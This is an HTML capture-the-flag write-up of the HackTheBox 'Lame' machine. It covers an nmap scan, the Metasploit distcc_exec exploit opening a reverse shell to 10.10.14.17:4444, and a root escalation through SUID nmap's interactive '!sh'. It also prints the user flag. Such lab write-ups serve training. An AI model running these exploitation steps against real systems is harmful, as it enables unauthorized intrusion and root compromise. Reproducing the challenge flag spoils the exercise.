@@ -1,0 +1,242 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>pwncone.io</title>
+    <link rel="stylesheet" href="../../../../css/style.css">
+  </head>
+
+<body>
+
+<section>
+    <writeup>
+        <h1><strong>hackthebox Lame</strong></h1>
+        <em>Released: March 2017 / Pwned: August 16th 2019 - [+] Solved whilst Retired</em><br>
+        <br>
+        <img alt="images\2-1.png" src="images/2-1.png"><br>
+        <br>
+        This box isn't lame. It's simple. And that makes a nice change sometimes.<br>
+        *NOTE: There's also a samba exploit that will drop you directly into a root shell. <br>I, for some reason, missed this.<br>
+        <br>
+        <a id="h3-1" name="h3-1"></a><strong></strong>
+        <h4><strong>Summary</strong></h4>
+        • Run nmap and find an interesting, high-port service<br>
+        • Use metasploit to gain a shell<br>
+        • Check for any SUID binaries on the system and spawn a shell using a certain binary's interactive mode<br>
+        <br>
+        <a id="h2-1" name="h2-1"></a><strong></strong>
+        <h2><strong>1) Nmap</strong></h2><br>
+        Run an all-port scan against Lame:<br>
+        <code>nmap -p- -T4 -sV -oN nmap/full.txt 10.10.10.3</code><br>
+        <br>
+        <code>-p-</code> all ports<br>
+        <code>-T4</code> a faster scan<br>
+        <code>-sV</code> enumerate versions<br>
+        <code>-oN</code> default output<br>
+        <br>
+        Results:<br>
+            <div class="codebox">
+                root@gotham:~/ctf/lame#&nbsp;mkdir&nbsp;nmap<br>
+                root@gotham:~/ctf/lame#&nbsp;nmap&nbsp;-p-&nbsp;-T4&nbsp;-sV&nbsp;-oN&nbsp;nmap/full.txt&nbsp;10.10.10.3<br>
+                ...<br>
+                Nmap&nbsp;scan&nbsp;report&nbsp;for&nbsp;10.10.10.3<br>
+                Host&nbsp;is&nbsp;up&nbsp;(0.039s&nbsp;latency).<br>
+                Not&nbsp;shown:&nbsp;65530&nbsp;filtered&nbsp;ports<br>
+                PORT&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;STATE&nbsp;SERVICE&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;VERSION<br>
+                21/tcp&nbsp;&nbsp;&nbsp;open&nbsp;&nbsp;ftp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;vsftpd&nbsp;2.3.4<br>
+                22/tcp&nbsp;&nbsp;&nbsp;open&nbsp;&nbsp;ssh&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;OpenSSH&nbsp;4.7p1&nbsp;Debian&nbsp;8ubuntu1&nbsp;(protocol&nbsp;2.0)<br>
+                139/tcp&nbsp;&nbsp;open&nbsp;&nbsp;netbios-ssn&nbsp;Samba&nbsp;smbd&nbsp;3.X&nbsp;-&nbsp;4.X&nbsp;(workgroup:&nbsp;WORKGROUP)<br>
+                445/tcp&nbsp;&nbsp;open&nbsp;&nbsp;netbios-ssn&nbsp;Samba&nbsp;smbd&nbsp;3.X&nbsp;-&nbsp;4.X&nbsp;(workgroup:&nbsp;WORKGROUP)<br>
+                3632/tcp&nbsp;open&nbsp;&nbsp;distccd&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;distccd&nbsp;v1&nbsp;((GNU)&nbsp;4.2.4&nbsp;(Ubuntu&nbsp;4.2.4-1ubuntu4))<br>
+                Service&nbsp;Info:&nbsp;OSs:&nbsp;Unix,&nbsp;Linux;&nbsp;CPE:&nbsp;cpe:/o:linux:linux_kernel<br>
+                <br>
+                Service&nbsp;detection&nbsp;performed.&nbsp;Please&nbsp;report&nbsp;any&nbsp;incorrect&nbsp;results&nbsp;at&nbsp;https://nmap.org/submit/&nbsp;.<br>
+                Nmap&nbsp;done:&nbsp;1&nbsp;IP&nbsp;address&nbsp;(1&nbsp;host&nbsp;up)&nbsp;scanned&nbsp;in&nbsp;100.59&nbsp;seconds
+            </div>
+        </div><br>
+        <br>
+        <strong>Services running</strong><br>
+        • 21/ftp - Anonymous login is allowed but there are no interesting files in the directory<br>
+        • 22/ssh - Useless for now<br>
+        • 139/smb - Can log in to the <code>tmp</code> share, but like ftp there's no interesting files<br>
+        • 3632/distcc - This looks interesting...<br>
+        <br>
+        <a id="h1-2" name="h1-2"></a><strong></strong>
+        <h1><strong>Gain Access</strong></h1>
+        <br>
+        <a id="h2-2" name="h2-2"></a><strong></strong>
+        <h2><strong>2) 3632/distcc</strong></h2><br>
+        If you <code>searchsploit</code> distcc you'll find a metasploit module.<br>
+            <div class="codebox">
+                root@gotham:~/ctf/lame#&nbsp;searchsploit&nbsp;distcc<br>
+                --------------------------------------------------------&nbsp;----------------------------------------<br>
+                &nbsp;Exploit&nbsp;Title&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|&nbsp;&nbsp;Path<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|&nbsp;(/usr/share/exploitdb/)<br>
+                --------------------------------------------------------&nbsp;----------------------------------------<br>
+                DistCC&nbsp;Daemon&nbsp;-&nbsp;Command&nbsp;Execution&nbsp;(Metasploit)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|&nbsp;exploits/multiple/remote/9915.rb<br>
+                --------------------------------------------------------&nbsp;----------------------------------------<br>
+                Shellcodes:&nbsp;No&nbsp;Result
+            </div>
+        </div><br>
+        <br>
+        Code execution!<br>
+        Load metasploit, select the exploit, have it point towards the target and <code>exploit</code>.<br>
+            <div class="codebox">
+                root@gotham:~/ctf/lame#&nbsp;msfconsole<br>
+                [-]&nbsp;***rting&nbsp;the&nbsp;Metasploit&nbsp;Framework&nbsp;console.../<br>
+                [-]&nbsp;*&nbsp;WARNING:&nbsp;No&nbsp;database&nbsp;support:&nbsp;could&nbsp;not&nbsp;connect&nbsp;to&nbsp;server:&nbsp;Connection&nbsp;refused<br>
+                Is&nbsp;the&nbsp;server&nbsp;running&nbsp;on&nbsp;host&nbsp;"localhost"&nbsp;(::1)&nbsp;and&nbsp;accepting<br>
+                TCP/IP&nbsp;connections&nbsp;on&nbsp;port&nbsp;5432?<br>
+                could&nbsp;not&nbsp;connect&nbsp;to&nbsp;server:&nbsp;Connection&nbsp;refused<br>
+                Is&nbsp;the&nbsp;server&nbsp;running&nbsp;on&nbsp;host&nbsp;"localhost"&nbsp;(127.0.0.1)&nbsp;and&nbsp;accepting<br>
+                TCP/IP&nbsp;connections&nbsp;on&nbsp;port&nbsp;5432?<br>
+                <br>
+                [-]&nbsp;***<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>
+                <br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;_---------.<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;.'&nbsp;#######&nbsp;&nbsp;&nbsp;;."<br>
+                &nbsp;&nbsp;.---,.&nbsp;&nbsp;&nbsp;&nbsp;;@&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;@@`;&nbsp;&nbsp;&nbsp;.---,..<br>
+                ."&nbsp;@@@@@'.,'@@&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;@@@@@',.'@@@@&nbsp;".<br>
+                '-.@@@@@@@@@@@@@&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;@@@@@@@@@@@@@&nbsp;@;<br>
+                &nbsp;&nbsp;&nbsp;`.@@@@@@@@@@@@&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;@@@@@@@@@@@@@@&nbsp;.'<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;"--'.@@@&nbsp;&nbsp;-.@&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;@&nbsp;,'-&nbsp;&nbsp;&nbsp;.'--"<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;".@'&nbsp;;&nbsp;@&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;@&nbsp;`.&nbsp;&nbsp;;'<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|@@@@&nbsp;@@@&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;@&nbsp;&nbsp;&nbsp;&nbsp;.<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'&nbsp;@@@&nbsp;@@&nbsp;&nbsp;&nbsp;@@&nbsp;&nbsp;&nbsp;&nbsp;,<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;`.@@@@&nbsp;&nbsp;&nbsp;&nbsp;@@&nbsp;&nbsp;&nbsp;.<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;',@@&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;@&nbsp;&nbsp;&nbsp;;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;_____________<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(&nbsp;&nbsp;&nbsp;3&nbsp;C&nbsp;&nbsp;&nbsp;&nbsp;)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;/|___&nbsp;/&nbsp;Metasploit!&nbsp;\<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;@'.&nbsp;__*__,."&nbsp;&nbsp;&nbsp;&nbsp;\|---&nbsp;\_____________/<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'(.,...."/<br>
+                <br>
+                <br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=[&nbsp;metasploit&nbsp;v5.0.22-dev&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;]<br>
+                +&nbsp;--&nbsp;--=[&nbsp;1890&nbsp;exploits&nbsp;-&nbsp;1065&nbsp;auxiliary&nbsp;-&nbsp;329&nbsp;post&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;]<br>
+                +&nbsp;--&nbsp;--=[&nbsp;546&nbsp;payloads&nbsp;-&nbsp;44&nbsp;encoders&nbsp;-&nbsp;10&nbsp;nops&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;]<br>
+                +&nbsp;--&nbsp;--=[&nbsp;2&nbsp;evasion&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;]<br>
+                <br>
+                msf5&nbsp;&gt;&nbsp;search&nbsp;distcc<br>
+                <br>
+                Matching&nbsp;Modules<br>
+                ================<br>
+                <br>
+                &nbsp;&nbsp;&nbsp;#&nbsp;&nbsp;Name&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Disclosure&nbsp;Date&nbsp;&nbsp;Rank&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Check&nbsp;&nbsp;Description<br>
+                &nbsp;&nbsp;&nbsp;-&nbsp;&nbsp;----&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;---------------&nbsp;&nbsp;----&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-----&nbsp;&nbsp;-----------<br>
+                &nbsp;&nbsp;&nbsp;0&nbsp;&nbsp;exploit/unix/misc/distcc_exec&nbsp;&nbsp;2002-02-01&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;excellent&nbsp;&nbsp;Yes&nbsp;&nbsp;&nbsp;&nbsp;DistCC&nbsp;Daemon&nbsp;Command&nbsp;Execution<br>
+                <br>
+                msf5&nbsp;&gt;&nbsp;use&nbsp;exploit/unix/misc/distcc_exec&nbsp;<br>
+                msf5&nbsp;exploit(unix/misc/distcc_exec)&nbsp;&gt;&nbsp;show&nbsp;options<br>
+                <br>
+                Module&nbsp;options&nbsp;(exploit/unix/misc/distcc_exec):<br>
+                <br>
+                &nbsp;&nbsp;&nbsp;Name&nbsp;&nbsp;&nbsp;&nbsp;Current&nbsp;Setting&nbsp;&nbsp;Required&nbsp;&nbsp;Description<br>
+                &nbsp;&nbsp;&nbsp;----&nbsp;&nbsp;&nbsp;&nbsp;---------------&nbsp;&nbsp;--------&nbsp;&nbsp;-----------<br>
+                &nbsp;&nbsp;&nbsp;RHOSTS&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;yes&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;The&nbsp;target&nbsp;address&nbsp;range&nbsp;or&nbsp;CIDR&nbsp;identifier<br>
+                &nbsp;&nbsp;&nbsp;RPORT&nbsp;&nbsp;&nbsp;3632&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;yes&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;The&nbsp;target&nbsp;port&nbsp;(TCP)<br>
+                <br>
+                <br>
+                Exploit&nbsp;target:<br>
+                <br>
+                &nbsp;&nbsp;&nbsp;Id&nbsp;&nbsp;Name<br>
+                &nbsp;&nbsp;&nbsp;--&nbsp;&nbsp;----<br>
+                &nbsp;&nbsp;&nbsp;0&nbsp;&nbsp;&nbsp;Automatic&nbsp;Target<br>
+                <br>
+                <br>
+                msf5&nbsp;exploit(unix/misc/distcc_exec)&nbsp;&gt;&nbsp;set&nbsp;RHOSTS&nbsp;10.10.10.3<br>
+                RHOSTS&nbsp;=&gt;&nbsp;10.10.10.3<br>
+                msf5&nbsp;exploit(unix/misc/distcc_exec)&nbsp;&gt;&nbsp;exploit<br>
+                <br>
+                [*]&nbsp;Started&nbsp;reverse&nbsp;TCP&nbsp;double&nbsp;handler&nbsp;on&nbsp;10.10.14.17:4444&nbsp;<br>
+                [*]&nbsp;Accepted&nbsp;the&nbsp;first&nbsp;client&nbsp;connection...<br>
+                [*]&nbsp;Accepted&nbsp;the&nbsp;second&nbsp;client&nbsp;connection...<br>
+                [*]&nbsp;Command:&nbsp;echo&nbsp;0FgXRtQpoZtw176t;<br>
+                [*]&nbsp;Writing&nbsp;to&nbsp;socket&nbsp;A<br>
+                [*]&nbsp;Writing&nbsp;to&nbsp;socket&nbsp;B<br>
+                [*]&nbsp;Reading&nbsp;from&nbsp;sockets...<br>
+                [*]&nbsp;Reading&nbsp;from&nbsp;socket&nbsp;B<br>
+                [*]&nbsp;B:&nbsp;"0FgXRtQpoZtw176t\r\n"<br>
+                [*]&nbsp;Matching...<br>
+                [*]&nbsp;A&nbsp;is&nbsp;input...<br>
+                [*]&nbsp;Command&nbsp;shell&nbsp;session&nbsp;1&nbsp;opened&nbsp;(10.10.14.17:4444&nbsp;-&gt;&nbsp;10.10.10.3:45657)&nbsp;at&nbsp;2019-08-16&nbsp;11:07:25&nbsp;+0100<br>
+                <br>
+                id<br>
+                uid=1(daemon)&nbsp;gid=1(daemon)&nbsp;groups=1(daemon)<br>
+                cd&nbsp;/home<br>
+                ls&nbsp;-alh<br>
+                total&nbsp;24K<br>
+                drwxr-xr-x&nbsp;&nbsp;6&nbsp;root&nbsp;&nbsp;&nbsp;&nbsp;root&nbsp;&nbsp;&nbsp;&nbsp;4.0K&nbsp;Mar&nbsp;14&nbsp;&nbsp;2017&nbsp;.<br>
+                drwxr-xr-x&nbsp;21&nbsp;root&nbsp;&nbsp;&nbsp;&nbsp;root&nbsp;&nbsp;&nbsp;&nbsp;4.0K&nbsp;May&nbsp;20&nbsp;&nbsp;2012&nbsp;..<br>
+                drwxr-xr-x&nbsp;&nbsp;2&nbsp;root&nbsp;&nbsp;&nbsp;&nbsp;nogroup&nbsp;4.0K&nbsp;Mar&nbsp;17&nbsp;&nbsp;2010&nbsp;ftp<br>
+                drwxr-xr-x&nbsp;&nbsp;2&nbsp;makis&nbsp;&nbsp;&nbsp;makis&nbsp;&nbsp;&nbsp;4.0K&nbsp;Mar&nbsp;14&nbsp;&nbsp;2017&nbsp;makis<br>
+                drwxr-xr-x&nbsp;&nbsp;2&nbsp;service&nbsp;service&nbsp;4.0K&nbsp;Apr&nbsp;16&nbsp;&nbsp;2010&nbsp;service<br>
+                drwxr-xr-x&nbsp;&nbsp;3&nbsp;&nbsp;&nbsp;&nbsp;1001&nbsp;&nbsp;&nbsp;&nbsp;1001&nbsp;4.0K&nbsp;May&nbsp;&nbsp;7&nbsp;&nbsp;2010&nbsp;user
+            </div>
+        </div><br>
+        <br>
+        At this point we have a shell on the system.<br>
+        You can grab <code>user.txt</code> from makis' home folder.<br>
+            <div class="codebox">
+                cat&nbsp;/home/makis/user.txt<br>
+                69454a937d94f5f0225ea00acd2e84c5
+            </div>
+        </div><br>
+        <br>
+        <a id="h1-3" name="h1-3"></a><strong></strong>
+        <h1><strong>Priv-Esc</strong></h1>
+        <br>
+        <a id="h2-3" name="h2-3"></a><strong></strong>
+        <h2><strong>3) Nmap Interactive</strong></h2><br>
+        Have a look for any SUID binaries on the system.<br>
+            <div class="codebox">
+                find&nbsp;/&nbsp;-perm&nbsp;-u=s&nbsp;2&gt;/dev/null<br>
+                ...<br>
+                /usr/bin/chfn<br>
+                /usr/bin/nmap<br>
+                /usr/bin/chsh<br>
+                /usr/bin/netkit-rcp<br>
+                /usr/bin/passwd<br>
+                ...
+            </div>
+        </div><br>
+        <br>
+        Nmap is an interesting result. And it's owned by root.<br>
+            <div class="codebox">
+                which&nbsp;nmap<br>
+                /usr/bin/nmap<br>
+                ls&nbsp;-l&nbsp;/usr/bin/nmap<br>
+                -rwsr-xr-x&nbsp;1&nbsp;root&nbsp;root&nbsp;780676&nbsp;Apr&nbsp;&nbsp;8&nbsp;&nbsp;2008&nbsp;/usr/bin/nmap
+            </div>
+        </div><br>
+        <br>
+        In older versions of Nmap, versions 2.02 to 5.21, there was an interactive mode in which you could execute shell commands using <code>!</code>.<br>
+        Check the installed Nmap version on the target system.<br>
+            <div class="codebox">
+                nmap&nbsp;-V<br>
+                <br>
+                Nmap&nbsp;version&nbsp;4.53&nbsp;(&nbsp;http://insecure.org&nbsp;)
+            </div>
+        </div><br>
+        <br>
+        Perfect! This version of Nmap will have an interactive mode.<br>
+        And since Nmap is SUID root binary, we can spawn a shell as root.<br>
+            <div class="codebox">
+                nmap&nbsp;--interactive<br>
+                <br>
+                Starting&nbsp;Nmap&nbsp;V.&nbsp;4.53&nbsp;(&nbsp;http://insecure.org&nbsp;)<br>
+                Welcome&nbsp;to&nbsp;Interactive&nbsp;Mode&nbsp;--&nbsp;press&nbsp;h&nbsp;&lt;enter&gt;&nbsp;for&nbsp;help<br>
+                nmap&gt;&nbsp;!sh<br>
+                id<br>
+                uid=1(daemon)&nbsp;gid=1(daemon)&nbsp;euid=0(root)&nbsp;groups=1(daemon)<br>
+                cd&nbsp;/root&nbsp;<br>
+                cat&nbsp;root.txt<br>
+                92caac...
+            </div>
+        </div>
+    </writeup>
+</section>
+
+</body>
+</html>
